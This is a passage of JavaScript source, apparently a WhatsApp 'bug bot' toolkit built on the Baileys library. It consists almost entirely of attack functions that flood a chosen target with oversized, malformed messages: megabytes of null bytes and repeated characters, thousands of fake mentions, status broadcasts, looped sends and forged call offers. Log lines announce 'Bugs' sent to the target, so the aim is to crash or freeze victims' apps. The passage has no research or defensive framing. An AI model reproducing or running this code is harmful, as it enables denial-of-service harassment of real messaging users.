                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      });
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              header: {
                title: "\u0000.VnxZ" + "{{".repeat(250000)
              },
              body: {
                text: "VnxZ"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(400000),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }, { participant: { jid: target } });
      const VnxZ = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: JSON.stringify({
                  flow_cta: "\u0000".repeat(90000)
                }),
                responseParamsJson: "\u0000".repeat(990000)
              }
            }
          }
        }
      };
      await sock.relayMessage(target, VnxZ, { 
        participant: { jid: target } 
      });
      await sock.sendMessage(target, { text: "Hello Word" });
      const Msg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0000".repeat(999999), 
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_VnxZ",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, Msg, {
        participant: { jid: target },
        userJid: target,
        messageId: null
      });
    }

    console.log("Success");

  } catch (error) {
    console.log("Error:", error);
  }
}

async function Blankuiii(sock, target) {
await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "1887967@g.us",
            inviteCode: "ꦽ".repeat(38000),
            inviteExpiration: "99999999999",
            groupName: "Meta Ai" + "ꦾ".repeat(99700),
            caption: "https://t.me/elyssavirellequeen", 
            body: { 
             text: "ꦾ".repeat(10000), 
          }, 
           newsletterAdminInviteMessage: {
            newsletterJid: "120363370508049655@newsletter",
            newsletterName: "ꦾ".repeat(980000),
            caption: "ꦽ".repeat(590000),
            inviteExpiration: "909092899",
            }
          }
        }
      }
    },
    { 
      messageId: null, 
      participant: { jid: target }, 
    } 
  ); 


   const msg1 = await generateWAMessageFromContent(target, {
   message: {
       stickerMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
               fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
               fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
               mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
               mimetype: "image/webp",
               height: 9999,
               width: 9999,
               directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
               fileLength: 12260,
               mediaKeyTimestamp: "1743832131",
               isAnimated: false,
               stickerSentTs: "X",
               isAvatar: false,
               isAiSticker: false,
               isLottie: false,
               contextInfo: {
                   mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       ),
                   ],
                   stanzaId: "1234567890ABCDEF",
                   quotedMessage: {
                       paymentInviteMessage: {
                           serviceType: 3,
                           expiryTimestamp: Date.now() + 1814400000
                       }
                   }
               }
           }
         }
       },
       {
           timestamp: Date.now(),
           userJid: sock.user.id
       });
       
   await sock.relayMessage(target, msg1.message, {
    participant: { jid: target },
    messageId: msg1.key.id,
    quoted: null
  });
}

async function SennUiOverload(sock, target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(120000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "☣️ ₳₦₲ɆⱠɆ₴ÐÌÄßLÖ§ Ɏ ÄñGÈLÈ§ Ɏ ÐÌÄßLÖ§ 🩸" + "ꦾ".repeat(120000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function Forcefixxed(sock, target) {
  const Raaa = {
   groupStatusMessageV2: {
     message: {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
         }
       }
     }
  }
  
  const msg = generateWAMessageFromContent(target, Raaa, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg.message
  }},
  {
   messageId: msg.key.id,
   participant: { jid: target }
  });
  await new Promise((r) => setTimeout(r, 1000));
}

async function delayinpis(sock, target) {
  for (let r = 0; r < 1000; r++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          orderMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              }
            }
          }
        }
      }
    }, { participant: { jid: target }, messageId: sock.generateMessageTag() });
  }
}

async function DelayBebasSpamPart1(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "@raraaimupp",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function DelayBebasSpamPart2(sock, target) {
  let msg1 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
          mimetype: "image/jpeg",
          fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
          fileLength: "99999999999999",
          height: 99999999,
          width: 99999999,
          mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
          fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
          directPath: "/v/t62.7118-24/533457741_1915833982583555_n.enc",
          mediaKeyTimestamp: "1755254367",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzVRMTNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          imageSourceType: "AI_GENERATE",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            stanzaId: "OBENG",
            mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 999,
            quotedMessage: {
              externalAdReplyInfo: {
                title: "ꦾ".repeat(50000),
                body: "ꦾ".repeat(50000),
                containsAutoReply: true,
                thumbnail: "https://files.catbox.moe/n49hk4.jpg",
                mediaUrl: "https://t.me/raraa_imupy",
                mediaType: 1,
                renderLargerThumbnail: true,
                adType: 1
              }
            }
          }
        }
      }
    }
  };
  
  const msgA = generateWAMessageFromContent(target, msg1, {});
  await sock.relayMessage("status@broadcast", msgA.message, {
    messageId: msgA.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{tag: "to", attrs: {jid: target}, content: undefined}]
      }]
    }]
  });
  
  let msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝗥𝗮͢𝗿̷𝗮⃨𝗮̷͢-𝗜͢𝗺𝗎⃨𝗽̷͢𝗽",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
            version: 3
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
          }
        }
      }
    }
  };
  
  const raa = generateWAMessageFromContent(target, msg2, {});
  await sock.relayMessage("status@broadcast", raa.message, {
    messageId: raa.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{tag: "to", attrs: {jid: target}, content: undefined}]
      }]
    }]
  });
  
  let msg3 = {
    extendedTextMessage: {
      text: "ꦾ".repeat(20000),
      title: "ꦾ".repeat(20000),
      contextInfo: {
        mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "🦠⃰͡°͜͡•⃟𝗥𝗮͢𝗿̷𝗮⃨𝗮̷͢-𝗜͢𝗺𝗎⃨𝗽̷͢𝗽",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
              version: 3
            }
          }
        }
      }
    }
  };
  
  const raa2 = generateWAMessageFromContent(target, msg3, {});
  await sock.relayMessage(target, raa2.message, {
    messageId: raa2.key.id,
    participant: {jid: target}
  });
}

async function Jtwdlyinvis(sock, target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ATTACK BY ÁNGELES Y DIABLOS",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ATTACK BY Taxall",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function DelayMakLoe(sock, target) {
  const raraa = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091", 
          isAvatar: false,
          isAiSticker: false,
          isLottie: null,
          contextInfo: {
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 500000 },
                () => ({ "\0": "\0" })
              )
            }
          }
        }
      }
    }
  }

  return await sock.relayMessage("status@broadcast", raraa, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Stickerssock(sock, target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "#AI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(25900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(4000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(10),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`🔥  Succes Sending Bugs To : ${target}`);  
    }

  } catch (e) {
    console.error(e);
  }
}

async function infiniteForceClose(sock, target) {
  const bomb = "x".repeat(200000) + "\u0000".repeat(80000) + "ꦾ".repeat(100000);
  const json = "{".repeat(200000);
  
  for(let i = 0; i < 15; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: bomb,
        paymentLinkMetadata: {
          button: { displayText: bomb },
          header: { headerType: 3, title: bomb, subtitle: bomb },
          provider: { paramsJson: json, name: bomb, signature: bomb },
          product: {
            id: bomb,
            name: bomb,
            description: bomb,
            image: {
              url: "https://mmg.whatsapp.net/d/" + bomb,
              mimetype: "image/jpeg",
              fileSha256: "A".repeat(1000),
              fileLength: "999999999999999999999",
              height: 9999999999999,
              width: 9999999999999,
              mediaKey: "B".repeat(1000),
              fileEncSha256: "C".repeat(1000),
              directPath: "/v/" + bomb,
              jpegThumbnail: Buffer.from("ff".repeat(300000), "hex")
            }
          }
        }
      }
    }, { participant: { jid: target }, messageId: sock.generateMessageTag() });
    
    await new Promise(r => setTimeout(r, 10));
  }
}

async function OnlyIos(sock, target) {
  const msgone = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝐀𝐤𝐮 𝐀𝐝𝐚𝐥𝐚𝐡 𝐏𝐫𝐢𝐚 𝐒𝐨𝐥𝐨",
      url: "https://t.me/",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "𝐍𝐨𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫"
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msgone } }, {
      participant: { jid: target }
    });
        console.log(chalk.green("Bug Ios Done"));
}

async function delayhard(sock, target) {
  try {
    for (let k = 0; k < 200; k++) {
      const Msg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "cta_always",
                paramsJson: { flow_cta: `${"\u0000".repeat(999999)}` }
              },
              body: {
                format: "DEFAULT",
                text: "\u0000".repeat(999999)
              }
            }
          }
        }
      };

      await sock.relayMessage(target, Msg, {
        messageId: null,
        userJid: target,
        participant: { jid: target }
      });
    }

    await sock.sendMessage(target, { text: "Clueless, as always" });

    console.log("Succes Send Bugs To Target");
  } catch (error) {
    console.error("Error:", error);
  }
}

async function ForceSqlVc(sock, target){

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await nando.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await nando.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = nando.createParticipantNodes.bind(nando);
    let yntkts = nando.encodeWAMessage?.bind(nando);

    nando.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (nando.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = nando.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await nando.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await nando.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: nando.generateMessageTag(),
            from: nando.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": nando.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(nando.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let NanMsg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                interactiveMessage: {
                    body: {
                        text: '( 🌷 ) Nando Officiall'
                    },
                    footer: {
                        text: '( 🌷 ) Nando Officiall'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
